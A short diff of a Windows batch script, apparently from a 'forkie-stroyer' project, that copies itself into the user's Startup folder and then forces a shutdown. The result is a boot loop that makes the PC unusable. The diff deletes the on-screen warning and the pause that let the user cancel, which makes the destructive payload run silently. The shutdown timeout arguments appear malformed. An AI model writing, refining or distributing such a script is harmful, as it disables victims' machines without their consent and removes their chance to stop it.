@@ -1,6 +1,4 @@
 @echo off
-echo WARNING THIS WILL MAKE THE PC UNUSABLE
-pause
 echo you asked for it m8
 copy "%USERPROFILE%\Downloads\forkie-stroyer-main\forkie-stroyer-main\stroyer.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
-shutdown -s -t -0
+shutdown -s -t -1
